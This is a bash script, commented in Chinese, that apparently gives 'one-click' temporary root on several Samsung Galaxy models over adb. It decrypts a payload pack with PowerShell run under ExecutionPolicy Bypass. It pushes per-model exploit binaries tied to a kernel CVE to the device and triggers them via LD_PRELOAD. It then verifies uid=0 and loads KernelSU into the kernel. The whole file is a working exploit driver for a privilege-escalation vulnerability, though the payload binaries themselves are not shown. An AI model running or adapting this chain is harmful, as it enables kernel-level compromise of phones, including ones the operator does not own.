#!/bin/bash
# =============================================================================
#  Samsung-root-kit multi-model one-click root (run_root.sh)
#  supports ALL models in payloads/  (S23/S24/S25/Z Fold5/Fold6/W26 ...)
#  memory root + KernelSU, reboot to clear, rerun to re-root
# =============================================================================

set -u
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
export PATH="$SCRIPT_DIR/adb-bin:$PATH"

PAYLOAD_DIR="$SCRIPT_DIR/payloads"
PACK="$SCRIPT_DIR/payloads.pack"
KSUD=""  # 由 select_ksud() 根据 uname -r 动态选择
KSUD_5_15="$SCRIPT_DIR/tools/ksud-samsung-android13-5.15-kdp"
KSUD_6_1="$SCRIPT_DIR/tools/ksud-samsung-android14-6.1-kdp"
KSUD_6_6="$SCRIPT_DIR/tools/ksud-samsung-android15-6.6-kdp"
KSUD_6_6_X730="$SCRIPT_DIR/tools/ksud-samsung-android15-6.6-kdp-x730"
KSUD_6_12="$SCRIPT_DIR/tools/ksud-samsung-android16-6.12-kdp"
APK="$SCRIPT_DIR/tools/KernelSU_Manager_v3.2.5_32525.apk"
CRYPT_PS="$SCRIPT_DIR/tools/payloads_crypt.ps1"

DEV_PAYLOAD="/data/local/tmp/cve-2026-43499"
DEV_ROOT="/data/local/tmp/cve-2026-43499-root"
DEV_KSUD="/data/local/tmp/ksud-selected"

EXPLOIT_ATTEMPTS=1
DO_PUSH=1
DO_KERNELSU=1
DO_APP=1
MODE="full"
WARMUP_ITERS=400
MODEL=""
WORK_DIR=""

# ---------- logging ----------
LOG_DIR="$SCRIPT_DIR/logs"
LOG_KEEP=10
LOG_VERBOSE=1
mkdir -p "$LOG_DIR" 2>/dev/null || LOG_DIR="$SCRIPT_DIR"
TS="$(date +%Y%m%d_%H%M%S)"
LOG_FILE="$LOG_DIR/run_${TS}.log"
LOG_ERR="$LOG_DIR/run_${TS}.err.log"
LOG_SUM="$LOG_DIR/run_${TS}.summary.txt"
: > "$LOG_FILE"; : > "$LOG_ERR"; : > "$LOG_SUM"

_cleanup() {
  if [ -n "$WORK_DIR" ] && [ -d "$WORK_DIR" ]; then rm -rf "$WORK_DIR" 2>/dev/null; fi
  if [ "$LOG_KEEP" -gt 0 ]; then
    ls -t "$LOG_DIR"/run_*.log 2>/dev/null | tail -n +$((LOG_KEEP+1)) | xargs -r rm -f 2>/dev/null
    ls -t "$LOG_DIR"/run_*.err.log 2>/dev/null | tail -n +$((LOG_KEEP+1)) | xargs -r rm -f 2>/dev/null
    ls -t "$LOG_DIR"/run_*.summary.txt 2>/dev/null | tail -n +$((LOG_KEEP+1)) | xargs -r rm -f 2>/dev/null
  fi
}
trap _cleanup EXIT INT TERM

_elog() {
  local type="$1" e="$2" s="$3"; shift 3
  local line
  line="[$(date +%H:%M:%S)][$type] $*"
  printf "%s\n" "$line" >> "$LOG_FILE"
  [ "$e" = "1" ] && printf "%s\n" "$line" >> "$LOG_ERR"
  [ "$s" = "1" ] && printf "%s\n" "$line" >> "$LOG_SUM"
  if [ "$LOG_VERBOSE" = "1" ]; then
    case "$type" in
      ERR)  printf "\033[31m%s\033[0m\n" "$line" ;;
      WARN) printf "\033[33m%s\033[0m\n" "$line" ;;
      OK)   printf "\033[32m%s\033[0m\n" "$line" ;;
      *)    printf "%s\n" "$line" ;;
    esac
  fi
}
log_info()  { _elog INFO  0 0 "$*"; }
log_ok()    { _elog OK    0 1 "$*"; }
log_warn()  { _elog WARN  1 1 "$*"; }
log_err()   { _elog ERR   1 1 "$*"; }
log_stage() { _elog STAGE 0 1 "$*"; }
die() { log_err "$*"; exit 1; }

run_adb() {
  local out rc
  out=$(adb "$@" 2>&1)
  rc=$?
  printf "%s\n" "[$(date +%H:%M:%S)][OUT] $out" >> "$LOG_FILE"
  [ $rc -ne 0 ] && printf "%s\n" "[$(date +%H:%M:%S)][OUT] $out" >> "$LOG_ERR"
  printf "%s\n" "$out"
  return $rc
}

# ---------- arg parse ----------
while [ $# -gt 0 ]; do
  case "$1" in
    --skip-push) DO_PUSH=0 ;;
    --no-app)    DO_APP=0 ;;
    --verify)    MODE="verify" ;;
    -n)          EXPLOIT_ATTEMPTS="$2"; shift ;;
    -h|--help)   echo "usage: run_root.sh [--verify] [--skip-push] [--no-app] [-n N]"; exit 0 ;;
    *) die "unknown arg: $1" ;;
  esac
  shift
done

model_display() {
  # $1=key 形如 dm3q-S9180ZCS8FZE3; 输出友好名
  local key="$1" board fw
  board="${key%%-*}"
  fw="${key#*-}"
  case "$board" in
    dm1q) echo "Galaxy S23 (SM-S9110)" ;;
    dm2q) echo "Galaxy S23+ (SM-S9160)" ;;
    dm3q) echo "Galaxy S23 Ultra (SM-S9180)" ;;
    e1q)  echo "Galaxy S24 (SM-S9210)" ;;
    e2q)  echo "Galaxy S24+ (SM-S9260)" ;;
    e3q)  echo "Galaxy S24 Ultra (SM-S9280)" ;;
    pa1q) echo "Galaxy S25 (SM-S9310)" ;;
    pa2q) echo "Galaxy S25+ (SM-S9360)" ;;
    pa3q) echo "Galaxy S25 Ultra (SM-S9380)" ;;
    psq)  echo "Galaxy S25 FE (SM-S9370)" ;;
    q5q)  echo "Galaxy Z Fold5 (SM-F9460)" ;;
    q7q)  echo "Galaxy Z Fold6 (SM-F9660)" ;;
    w9026)echo "Galaxy W26 (SM-W9026)" ;;
    *)    echo "$board" ;;
  esac
}

echo "============================================================"
echo "        即将申请 临时 ROOT 权限"
echo "============================================================"
echo ""
echo " ROOT 属于系统最高控制权限，获取该权限可能会带来以下风险："
echo ""
echo " [系统稳定性] 部分系统功能可能异常、卡顿或导致设备重启，甚至成砖。"
echo " [数据安全]   请勿向不可信的应用授予 ROOT 权限，以防个人隐私泄露或数据丢失。"
echo " [安全防护]   部分对安全要求较高的应用（如银行、支付、游戏等）可能会限制运行。"
echo -e "\033[1;31m[特别提醒]   root后不能刷入更改分区的模块，不能改刷面具，会砖！会砖！！会砖！！！\033[0m"
echo ""
echo " 本工具获取的权限仅为 临时生效，重启设备后系统将自动恢复默认安全状态。"
echo -e "\033[1;31m root后不能刷入更改分区的模块，不能改刷面具，会砖！会砖！！会砖！！！\033[0m"
echo " 本应用不会收集或篡改您的个人隐私数据。"
echo ""
echo " 请确认您已了解上述风险，并自愿承担相关操作后果。"
read -r -p "    确认无误请输入 yes 继续: " ans
[ "$ans" = "yes" ] || die "未确认，已退出"
log_ok "已确认，继续"

# ---------- 兜底清理：上次异常退出（强杀/关窗）残留的临时解密目录 ----------
find "${TMPDIR:-/tmp}" -maxdepth 1 -type d -name 's9180_root_*' -mmin +60 -exec rm -rf {} + 2>/dev/null

# ---------- 准备 payload 源（优先解密 payloads.pack） ----------
msys2win() {
  # Git Bash 下将 MSYS 路径 (/d/xxx) 转为 Windows 路径 (D:\xxx)
  local p="$1"
  case "$p" in
    /[a-zA-Z]/*) printf "%s:%s" "${p:1:1}" "${p:2}" ;;
    *) printf "%s" "$p" ;;
  esac
}
if [ -f "$PACK" ]; then
  # Git Bash 下 $TEMP 可能是 /tmp 等 MSYS 路径，需转为 Windows 路径交给 PowerShell
  WORK_DIR="$(mktemp -d 2>/dev/null || echo "${TMPDIR:-/tmp}/s9180_root_$$")"
  PS_WORK_DIR="$(cd "$WORK_DIR" && pwd -W 2>/dev/null || echo "$WORK_DIR")"
  PS_CRYPT="$(msys2win "$CRYPT_PS")"
  PS_PACK="$(msys2win "$PACK")"
  if powershell -NoProfile -ExecutionPolicy Bypass -File "$PS_CRYPT" -Action Unpack -PackFile "$PS_PACK" -OutDir "$PS_WORK_DIR" >/dev/null 2>&1; then
    PAYLOAD_DIR="$WORK_DIR"
  else
    die "解密 payloads.pack 失败"
  fi
else
  PAYLOAD_DIR="$SCRIPT_DIR/payloads"
fi
echo "  [OK] 准备就绪。"

# ---------- KMI auto-detect & ksud select ----------
select_ksud() {
  local kver="$1"
  local dev="$2"
  # 从 uname -r 提取主版本: 5.15.x → 5.15; 6.1.x → 6.1; 6.6.x → 6.6
  local kmaj
  kmaj="$(printf '%s' "$kver" | grep -oE '^[0-9]+\.[0-9]+' | head -1)"
  case "$kmaj" in
    5.15) KSUD="$KSUD_5_15" ; log_info "KMI=$kmaj -> android13-5.15 ksud" ;;
    6.12) KSUD="$KSUD_6_12" ; log_info "KMI=$kmaj -> android16-6.12 ksud" ;;
    6.1)  KSUD="$KSUD_6_1"  ; log_info "KMI=$kmaj -> android14-6.1 ksud" ;;
    6.6)
      # gts11wifi (SM-X730) 用 -x730 版
      if [ "$dev" = "gts11wifi" ]; then
        KSUD="$KSUD_6_6_X730"
        log_info "KMI=$kmaj (x730) -> android15-6.6-x730 ksud"
      else
        KSUD="$KSUD_6_6"
        log_info "KMI=$kmaj -> android15-6.6 ksud"
      fi
      ;;
    *) KSUD="$KSUD_5_15"; log_warn "unknown KMI=$kmaj, fallback to 5.15 ksud" ;;
  esac
  [ -f "$KSUD" ] || die "ksud not found: $KSUD"
}

check_adb() { command -v adb >/dev/null 2>&1 || die "adb not found; 设置 ADB_BIN 或把 platform-tools 加入 PATH"; }

echo ""
echo "============================================================"
echo " [1] 自动读取手机型号及版本并匹配（需连接手机并开启 USB 调试）"
echo " [2] 手动选择机型"
echo "============================================================"
read -r -p "    请选择 (1/2): " choice

if [ "$choice" = "1" ]; then
  # ---------- 自动匹配 ----------
  check_adb
  state=$(adb get-state 2>/dev/null) || die "adb cannot reach device"
  [ "$state" = "device" ] || die "device state=$state; enable USB debugging and authorize"
  # 只读 fingerprint（已包含 board 与 firmware，唯一对应一个 payload）
  FP=$(adb shell getprop ro.build.fingerprint 2>/dev/null | tr -d "\r\n")
  [ -n "$FP" ] || die "cannot read ro.build.fingerprint from device"
  MATCH=""
  MATCH_BOARD=""
  MATCH_FW=""
  # 遍历所有 payload，对每个 KEY 拆出 board / fw。
  # 注意：fp 中的 board 字段（如 dm3qzcx）未必等于文件名 board 字段（如 dm3q），
  # 但 fw 字符串（如 S9180ZCS8FZE3）在两边都唯一存在，所以按 fw 匹配更可靠。
  MODELS=()
  for f in "$PAYLOAD_DIR"/*__payload; do
    [ -e "$f" ] || continue
    base=$(basename "$f")
    key="${base%__payload}"
    b="${key%%-*}"
    fw="${key#*-}"
    [ -n "$fw" ] || continue
    if printf "%s" "$FP" | grep -qi "$fw"; then
      MODELS+=("$key|$b|$fw")
    fi
  done
  if [ "${#MODELS[@]}" -gt 0 ]; then
    # 可能有多个机型共享同一 fw（如 dm3q/e1q 等），取第一个最常见的（按文件名字典序）
    IFS='|' read -r MATCH MATCH_BOARD MATCH_FW <<< "${MODELS[0]}"
  fi
  if [ -z "$MATCH" ]; then
    echo "  [WARN] 未能自动匹配到对应机型 payload，已切换为手动选择："
    choice="2"
  else
    # 若同一 fw 命中多个机型，给用户提示
    if [ "${#MODELS[@]}" -gt 1 ]; then
      echo "  [INFO] 该固件版本匹配到 ${#MODELS[@]} 个候选机型，使用：${MATCH}"
    fi
    echo "  [OK] 已识别设备：[${MATCH}] (board=${MATCH_BOARD} fw=${MATCH_FW})  [$(model_display "$MATCH")]"
    read -r -p "    确认无误请输入 yes 开始自动操作: " c2
    [ "$c2" = "yes" ] || die "已取消"
    MODEL="$MATCH"
  fi
fi

if [ "$choice" = "2" ]; then
  # ---------- 手动选择 ----------
  echo "  [*] 支持的机型列表："
  MODELS=()
  i=0
  for f in "$PAYLOAD_DIR"/*__payload; do
    [ -e "$f" ] || continue
    i=$((i+1))
    base=$(basename "$f")
    key="${base%__payload}"
    MODELS+=("$key")
    printf "   [%d] %s  [%s]  固件: %s\n" "$i" "$key" "$(model_display "$key")" "${key#*-}"
  done
  echo ""
  read -r -p "    请输入机型编号: " sel
  MODEL="${MODELS[$((sel-1))]:-}"
  [ -n "$MODEL" ] || die "无效编号"
  echo "  [*] 已选择机型: $MODEL  [$(model_display "$MODEL")]  固件: ${MODEL#*-}"
  read -r -p "    确认无误请输入 yes 开始自动操作: " c2
  [ "$c2" = "yes" ] || die "已取消"
fi

[ -n "$MODEL" ] || die "未选择机型"
PAYLOAD="$PAYLOAD_DIR/${MODEL}__payload"
ROOT_HELPER="$PAYLOAD_DIR/${MODEL}__root"
[ -f "$PAYLOAD" ] || die "missing payload: $PAYLOAD"
[ -f "$ROOT_HELPER" ] || die "missing root helper: $ROOT_HELPER"
echo "  [OK] 机型: $MODEL"

log_stage "start (mode=$MODE, model=$MODEL, attempts=$EXPLOIT_ATTEMPTS)"

# ---------- device check & KMI detect (must run before KSUD file check) ----------
check_adb
state=$(adb get-state 2>/dev/null) || die "adb cannot reach device"
[ "$state" = "device" ] || die "device state=$state (expected device)"
log_ok "device connected"

FW_KERNEL=$(adb shell uname -r 2>/dev/null | tr -d "\r\n")
BOARD_DEV=$(adb shell getprop ro.product.board 2>/dev/null | tr -d "\r\n")
select_ksud "$FW_KERNEL" "$BOARD_DEV"
log_info "KMI selected: $FW_KERNEL -> $KSUD"
[ -f "$KSUD" ] || die "missing ksud: $KSUD"

FW_FP=$(adb shell getprop ro.build.fingerprint 2>/dev/null | tr -d "\r\n")
FW_EXPECT="${MODEL#*-}"
log_info "kernel=$FW_KERNEL"
log_info "fingerprint=$FW_FP"
echo "kernel: $FW_KERNEL"
echo "fingerprint: $FW_FP"
printf "%s" "$FW_FP" | grep -qi "$FW_EXPECT" || {
  log_warn "firmware mismatch (expected $FW_EXPECT)"
  read -r -p "    force continue? (type YES): " ans
  [ "$ans" = "YES" ] || die "cancelled"
}

if [ "$MODE" = "verify" ]; then
  log_stage "verify mode"
  run_adb shell "ls -l $DEV_PAYLOAD $DEV_ROOT $DEV_KSUD" || true
  run_adb shell "cat /proc/modules" | grep -i kernelsu && log_ok "kernelsu loaded (device currently rooted)" || log_warn "kernelsu not loaded"
  log_ok "verify done"
  exit 0
fi

# ---------- push ----------
if [ "$DO_PUSH" = "1" ]; then
  log_stage "pushing files"
  run_adb push "$PAYLOAD" "$DEV_PAYLOAD" >/dev/null || die "push payload failed"
  run_adb push "$ROOT_HELPER" "$DEV_ROOT" >/dev/null || die "push root helper failed"
  run_adb push "$KSUD" "$DEV_KSUD" >/dev/null || die "push ksud failed"
  run_adb shell chmod 755 "$DEV_PAYLOAD" "$DEV_ROOT" "$DEV_KSUD" || die "chmod failed"
  log_ok "3 files pushed and chmod 755"
else
  log_warn "--skip-push: skipping push"
fi

# ---------- exploit ----------
log_stage "warmup ($WARMUP_ITERS x /system/bin/true)"
run_adb shell "i=0; while [ \$i -lt $WARMUP_ITERS ]; do /system/bin/true; i=\$((i+1)); done" || true

log_stage "triggering exploit (EXPLOIT_ATTEMPTS=$EXPLOIT_ATTEMPTS)"
echo "    device may reboot - normal"

ROOT_OK=0
for attempt in 1 2 3; do
  log_stage "exploit attempt $attempt/3"
  adb wait-for-device 2>/dev/null
  sleep 2
  out=$(adb shell "CVE43499_ROOT_HELPER=$DEV_ROOT EXPLOIT_ATTEMPTS=$EXPLOIT_ATTEMPTS LD_PRELOAD=$DEV_PAYLOAD /system/bin/true" 2>&1)
  printf "%s\n" "[$(date +%H:%M:%S)][OUT] $out" >> "$LOG_FILE"
  if printf "%s" "$out" | grep -q "temporary-root-ready"; then
    ROOT_OK=1
    log_ok "stage=temporary-root-ready (attempt $attempt)"
    break
  fi
  if printf "%s" "$out" | grep -q "operation failed"; then
    log_warn "operation failed; 若上一轮已成功过，说明 KernelSU 已加载——重启设备后重跑即可"
  fi
  id_out=$(adb exec-out "$DEV_ROOT" -c /system/bin/id 2>/dev/null)
  if printf "%s" "$id_out" | grep -q "uid=0(root)"; then
    ROOT_OK=1
    log_ok "uid=0(root) confirmed (attempt $attempt)"
    break
  fi
  if [ "$attempt" -lt 3 ]; then log_warn "attempt $attempt not successful; retry in 3s"; sleep 3; fi
done

if [ "$ROOT_OK" != "1" ]; then
  log_err "exploit did not obtain root"
  echo "diagnosis:"
  echo "  * KernelSU 已加载时二次触发会 operation failed -> 重启设备后再跑"
  echo "  * 若日志有 E101 -> payload/root 未打补丁或文件不匹配"
  exit 1
fi

log_stage "root obtained"
run_adb exec-out "$DEV_ROOT" -c /system/bin/id || true

# ---------- KernelSU ----------
if [ "$DO_KERNELSU" = "1" ]; then
  log_stage "installing KernelSU (late-load)"
  run_adb shell "$DEV_ROOT" --late-load || true
  sleep 2
  MOD_OUT=$(adb shell cat /proc/modules 2>/dev/null)
  if printf "%s" "$MOD_OUT" | grep -qi "kernelsu"; then
    log_ok "kernelsu loaded"
    printf "%s\n" "$MOD_OUT" | grep -i kernelsu
  else
    log_err "kernelsu not in /proc/modules"
    echo "retry: adb shell $DEV_ROOT --late-load"
  fi
fi

# ---------- KernelSU Manager App ----------
if [ "$DO_APP" = "1" ]; then
  log_stage "installing KernelSU Manager app"
  if run_adb install -r "$APK"; then
    log_ok "KernelSU Manager installed (me.weishu.kernelsu)"
    adb shell am start -n me.weishu.kernelsu/.ui.MainActivity 2>/dev/null || true
  else
    log_warn "app install failed (may need to open manually)"
  fi
fi

echo ""
echo "============================================================"
echo "  done. 说明:"
echo "  * root 是内存态，重启后失效；再次 root 直接重跑本脚本"
echo "  * 二次运行若 operation failed：先重启设备再跑"
echo "============================================================"
log_ok "all done"
